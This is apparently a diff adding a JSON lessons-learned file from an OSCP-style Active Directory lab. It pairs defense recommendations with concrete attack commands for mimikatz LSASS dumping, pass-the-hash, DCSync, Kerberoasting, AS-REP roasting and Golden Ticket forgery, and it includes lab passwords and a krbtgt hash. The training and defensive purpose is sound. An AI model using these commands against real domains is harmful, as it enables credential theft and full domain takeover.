+    {
+      "category": "enumeration",
+      "lesson": "BloodHound custom Cypher queries reveal attack paths that pre-built queries miss",
+      "detail": "Pre-built query 'Shortest Paths to Domain Admins' from pete returned 'No paths found'. Custom Cypher query 'MATCH (u:User {name:'MIKE@CORP.COM'})-[:AdminTo]->(c) RETURN u,c' revealed mike's local admin on CLIENT75, unlocking entire attack chain. Pre-built queries are starting point, not complete solution. OSCP EXAM: Learn basic Cypher syntax - test multiple users for AdminTo, test computers for HasSession. Don't give up after first query failure.",
+      "importance": "critical",
+      "oscp_applicable": true
+    },
+    {
+      "category": "lateral_movement",
+      "lesson": "Evil-WinRM superior to PSExec for lateral movement in OSCP exam",
+      "detail": "Evil-WinRM advantages: (1) Interactive PowerShell (better than semi-interactive PSExec), (2) File upload/download built-in (no SMB server needed), (3) No service creation (PSExec creates PSEXESVC service - noisy), (4) Bypasses PowerShell execution policy automatically. PSExec use cases: When WinRM disabled, when need SYSTEM shell immediately. OSCP EXAM: Try Evil-WinRM first when you have local admin credentials.",
+      "importance": "high",
+      "oscp_applicable": true
+    },
+    {
+      "category": "credential_access",
+      "lesson": "Mimikatz privilege::debug is MANDATORY before sekurlsa commands",
+      "detail": "sekurlsa::logonpasswords requires SeDebugPrivilege to access LSASS memory. Even local administrators don't have this privilege enabled by default (Windows security). Must explicitly request with privilege::debug. Failure results in 'Handle on memory (0x00000005)' Access Denied error. ALWAYS run: .\\mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\". Verify success: 'Privilege '20' OK' message. OSCP EXAM: Memorize two-step mimikatz syntax to avoid wasting time troubleshooting.",
+      "importance": "critical",
+      "oscp_applicable": true
+    },
+    {
+      "category": "credential_access",
+      "lesson": "DCSync doesn't require code execution on Domain Controller",
+      "detail": "DCSync exploits MS-DRSR (Directory Replication Service Remote Protocol) - designed for DC-to-DC replication. Domain Admin can request replication from ANY machine (Kali, compromised workstation). DC cannot distinguish legitimate DC from attacker. No need for: (1) RDP/WinRM to DC, (2) File upload to DC, (3) NTDS.dit exfiltration from DC disk. Run from Kali with impacket-secretsdump. OSCP EXAM: DCSync is FASTEST full domain compromise (seconds vs. hours for NTDS.dit extraction).",
+      "importance": "critical",
+      "oscp_applicable": true
+    },
+    {
+      "category": "credential_access",
+      "lesson": "Pass-the-Hash works without plaintext passwords - faster than cracking",
+      "detail": "NTLM hashes are sufficient for Windows authentication (NTLM SSP). No need to crack hash to plaintext password. Pass-the-Hash workflow: (1) Dump NTLM hash with mimikatz, (2) Authenticate with hash using Evil-WinRM -H or impacket -hashes :NTLM. Time savings: hashcat NTLM cracking = hours/days (GPU-dependent), Pass-the-Hash = instant. OSCP EXAM: ALWAYS try Pass-the-Hash before attempting password cracking. Only crack if you need plaintext for specific protocol (RDP without Restricted Admin, SSH, VPN).",
+      "importance": "critical",
+      "oscp_applicable": true
+    },
+    {
+      "category": "enumeration",
+      "lesson": "Local admin access enables credential dumping on workstations",
+      "detail": "Local administrator can: (1) Enable SeDebugPrivilege (privilege::debug), (2) Access LSASS process memory (mimikatz sekurlsa), (3) Read SAM/SYSTEM registry hives, (4) Dump credentials of ALL logged-on users (including Domain Admins if sessions present). OSCP EXAM: Local admin on workstation is PIVOT OPPORTUNITY, not dead end. Always check for cached Domain Admin credentials with mimikatz. Workstations often have valuable service sessions from privileged accounts.",
+      "importance": "high",
+      "oscp_applicable": true
+    },
+    {
+      "category": "time_management",
+      "lesson": "BloodHound analysis maximum 20 minutes budget, then move to exploitation",
+      "detail": "BloodHound analysis time budget: 5 min collection, 5 min upload/ingest, 10 min graph queries. If no clear path after 20 minutes, use what you have and proceed with lateral movement. Can always re-analyze after compromising additional accounts. Diminishing returns after 20 min - graph complexity without clear attack path = analysis paralysis. OSCP EXAM: Time is limited (24 hours). Spending 2 hours on BloodHound = 2 hours not compromising machines. Set timer, stick to budget, move forward.",
+      "importance": "high",
+      "oscp_applicable": true
+    },
+    {
+      "category": "methodology",
+      "lesson": "Manual verification beats automated tool defaults - trust but verify",
+      "detail": "BloodHound pre-built query failed, custom Cypher succeeded. CrackMapExec subnet scan failed, IP range succeeded. Always have manual alternatives: (1) BloodHound fails → manual JSON parsing with jq, (2) Automated tools fail → manual commands (net user, Get-ADUser). OSCP EXAM: Don't blindly trust tool output. If tool says 'no paths found' or fails, verify manually. Tools have limitations (collection scope, parsing bugs, version issues). Verify critical findings manually before moving forward.",
+      "importance": "high",
+      "oscp_applicable": true
+    }
+  ],
+  "alternative_approaches": {
+    "enumeration": [
+      {
+        "method": "Password Spray using dave:Flowers1 pattern",
+        "description": "dave's password (Flowers1) follows common pattern: Capitalized word + numbers. Could spray pattern against other users: Flowers1, Password1, Welcome1, Spring2024, etc. May compromise additional accounts with admin privileges.",
+        "reason_not_taken": "dave is standard user with no special privileges (not in admin groups, no AdminTo relationships in BloodHound). Password spray risk: Account lockout policy (5 attempts, 30-min lockout). Compromising additional low-privileged users doesn't advance attack chain. Service session provided direct Domain Admin path.",
+        "tools_required": ["crackmapexec", "kerbrute"],
+        "estimated_time_minutes": 20,
+        "success_probability": "low",
+        "oscp_applicable": true,
+        "notes": "Password spray is OSCP exam viable when: (1) No BloodHound path exists, (2) Multiple users with potential admin privileges, (3) Lockout policy permits safe attempts (<5 per user). ALWAYS check password policy first: crackmapexec smb DC_IP -u user -p pass --pass-pol. Safe spray: 3 passwords max per user, 30-min delay between rounds. Example patterns: Password1, Welcome1, Spring2024, Summer2024, Company123."
+      }
+    ],
+    "privilege_escalation": [
+      {
+        "method": "Kerberoasting iis_service account",
+        "description": "Request TGS service ticket for iis_service account (has SPN) and crack offline to obtain plaintext password. If iis_service has admin privileges on systems, can pivot similar to mike.",
+        "reason_not_taken": "Service session approach was faster - maria's Domain Admin hash already cached on CLIENT75. Kerberoasting requires: (1) Requesting TGS with GetUserSPNs.py, (2) Offline cracking with hashcat (time-consuming, GPU-dependent, may fail if strong password). Service session provided instant Domain Admin access without cracking.",
+        "tools_required": ["impacket-GetUserSPNs", "hashcat"],
+        "estimated_time_minutes": 30,
+        "success_probability": "medium",
+        "oscp_applicable": true,
+        "notes": "Kerberoasting is OSCP exam viable when: (1) Service accounts have SPNs, (2) Passwords are weak/crackable, (3) No faster path available. Always try GetUserSPNs.py during enumeration - low cost, high reward if successful. Example: impacket-GetUserSPNs corp.com/pete:Nexus123! -request -dc-ip 192.168.223.70, hashcat -m 13100 tgs.hash /usr/share/wordlists/rockyou.txt"
+      },
+      {
+        "method": "AS-REP Roasting mike (DONT_REQ_PREAUTH)",
+        "description": "mike has 'Do not require Kerberos preauthentication' flag set. Can request AS-REP without authentication and crack offline to obtain plaintext password. Faster than Kerberoasting (no TGS request needed).",
+        "reason_not_taken": "Already had mike's password (Darkness1099!) from previous password spray or enumeration. AS-REP Roasting would duplicate effort. Additionally, mike's value was local admin on CLIENT75 (for lateral movement), not his credentials specifically.",
+        "tools_required": ["impacket-GetNPUsers", "hashcat"],
+        "estimated_time_minutes": 15,
+        "success_probability": "high",
+        "oscp_applicable": true,
+        "notes": "AS-REP Roasting is OSCP exam HIGH-VALUE when 'DONT_REQ_PREAUTH' users exist. Advantages: (1) No authentication required (can run with any domain user or even anonymously if LDAP allows), (2) Faster than Kerberoasting (no service ticket request), (3) Often weak passwords (accounts misconfigured, not monitored). Example: impacket-GetNPUsers corp.com/ -no-pass -usersfile users.txt -dc-ip 192.168.223.70 (anonymous), hashcat -m 18200 asrep.hash rockyou.txt. Check for vulnerable users: crackmapexec ldap DC_IP -u user -p pass --asreproast"
+      }
+    ],
+    "post_exploitation": [
+      {
+        "method": "Golden Ticket using krbtgt hash for persistence",
+        "description": "With krbtgt hash (1693c6cefafffc7af11ef34d1c788f47) from DCSync, forge Kerberos TGTs for any user (including non-existent users). Provides unlimited domain access without re-authentication. Tickets valid until krbtgt password changed (default 60 days, often never in labs).",
+        "reason_not_taken": "This is POST-COMPROMISE persistence mechanism, not privilege escalation path. Golden Ticket requires krbtgt hash (obtained via DCSync in Phase 5). Used AFTER domain compromise for persistent access, not for initial compromise. Flag retrieval only required single Administrator access, not long-term persistence.",
+        "tools_required": ["impacket-ticketer", "mimikatz", "impacket-psexec with TGT"],
+        "estimated_time_minutes": 10,
+        "success_probability": "high",
+        "oscp_applicable": true,
+        "notes": "Golden Ticket is OSCP exam viable for PERSISTENCE after Domain Admin compromise. Use cases: (1) Maintain access after password resets, (2) Access domain without network connection to DC (offline attack), (3) Bypass EDR/monitoring (valid TGT, not suspicious). Example: impacket-ticketer -nthash 1693c6cefafffc7af11ef34d1c788f47 -domain-sid S-1-5-21-... -domain corp.com -spn cifs/dc1.corp.com Administrator, export KRB5CCNAME=Administrator.ccache, impacket-psexec corp.com/Administrator@dc1.corp.com -k -no-pass. Requires: krbtgt hash + domain SID. Get SID: impacket-lookupsid corp.com/user:pass@dc1"
+      }
+    ]
+  },
+  "defense_recommendations": [
+    {
+      "category": "credential_protection",
+      "priority": "critical",
+      "recommendation": "Enable Windows Defender Credential Guard on all Windows 10+ systems",
+      "implementation": "Group Policy: Computer Configuration → Administrative Templates → System → Device Guard → Turn On Virtualization Based Security. Enable: Credential Guard Configuration = Enabled with UEFI lock. Requires: UEFI firmware, virtualization extensions (VT-x/AMD-V), Second Level Address Translation (SLAT).",
+      "impact": "Prevents mimikatz sekurlsa module from accessing LSASS memory. Credentials stored in isolated virtualization-based security container (separate from OS). Blocks credential dumping attacks completely.",
+      "oscp_notes": "Credential Guard BLOCKS mimikatz in modern environments. OSCP exam labs typically don't have Credential Guard enabled (to allow credential dumping practice). Real-world: Credential Guard adoption increasing in corporate environments - mimikatz less effective. Alternative attacks needed: NTDS.dit extraction, Kerberoasting, AS-REP Roasting."
+    },
+    {
+      "category": "privilege_separation",
+      "priority": "critical",
+      "recommendation": "Remove Domain Admin accounts from workstation service contexts",
+      "implementation": "Implement tiered administration model: Tier 0 (Domain Admins) = DC/domain management ONLY, Tier 1 (Server Admins) = servers ONLY, Tier 2 (Workstation Admins) = workstations ONLY. Use Group Managed Service Accounts (gMSA) with minimal privileges for scheduled tasks. Audit: Get-WmiObject Win32_Service | Where-Object {$_.StartName -like '*Administrator*' -or $_.StartName -like '*Domain Admins*'}.",
+      "impact": "Prevents service session credential caching on workstations. Domain Admin credentials never present in workstation LSASS memory. Breaks lateral movement path: local admin on workstation → mimikatz → Domain Admin credentials.",
+      "oscp_notes": "Service session attacks are COMMON in OSCP labs because they're COMMON in real enterprises. Why: Admins create scheduled tasks with DA credentials for 'convenience', then forget. Defense: Use gMSA (automatically rotated passwords, no caching) + principle of least privilege. OSCP attack: Look for service sessions on EVERY compromised admin-level system."
+    },
+    {
+      "category": "access_control",
+      "priority": "high",
+      "recommendation": "Implement LAPS (Local Administrator Password Solution) for unique local admin passwords",
+      "implementation": "Deploy Microsoft LAPS via Group Policy. LAPS automatically: (1) Generates unique random password per computer, (2) Stores in AD computer object (encrypted), (3) Rotates on schedule (default 30 days). Removes predictable local admin passwords (same password across all workstations). Requires: AD schema extension, LAPS GPO templates, LAPS client MSI on endpoints.",
+      "impact": "Prevents lateral movement with single compromised local admin credential. Attacker who dumps local admin hash on CLIENT75 cannot use same hash on CLIENT76. Forces attacker to compromise each system individually (time-consuming).",
+      "oscp_notes": "LAPS is DEPLOYED in modern corporate environments but RARE in OSCP labs (to allow lateral movement practice). LAPS bypass: Compromise user with LAPS password read permission in AD (often helpdesk, server admins). Read LAPS password: Get-ADComputer CLIENT75 -Properties ms-Mcs-AdmPwd | Select-Object ms-Mcs-AdmPwd. OSCP attack: Check for LAPS during enumeration, adjust lateral movement strategy."
+    },
+    {
+      "category": "detection",
+      "priority": "high",
+      "recommendation": "Monitor Event ID 4662 for anomalous DCSync replication requests",
+      "implementation": "SIEM rule: Alert on Event ID 4662 (Directory Service Access) with Properties containing: {1131f6aa-9c07-11d1-f79f-00c04fc2dcd2} (DS-Replication-Get-Changes) OR {1131f6ad-9c07-11d1-f79f-00c04fc2dcd2} (DS-Replication-Get-Changes-All). Filter: Subject Security ID NOT IN (known DC computer accounts). Trigger: Replication request from non-DC source = DCSync attack.",
+      "impact": "Enables detection of DCSync attacks in progress. Event 4662 logged on DC when replication requested. Alert within seconds of attack (before credential theft complete). Allows incident response: (1) Disable compromised account, (2) Reset krbtgt password (invalidate Golden Tickets), (3) Investigate lateral movement source.",
+      "oscp_notes": "DCSync logging is ENABLED by default (Event ID 4662) but ALERTING is NOT. OSCP labs don't monitor for DCSync (to allow attack practice). Real-world: Modern EDR/SIEM detect DCSync. Defense evasion: None reliable - DCSync requires 'Replicating Directory Changes' permission (logged). OSCP attack: DCSync is fast (seconds) - complete before detection response."
+    }
+  ]
+}
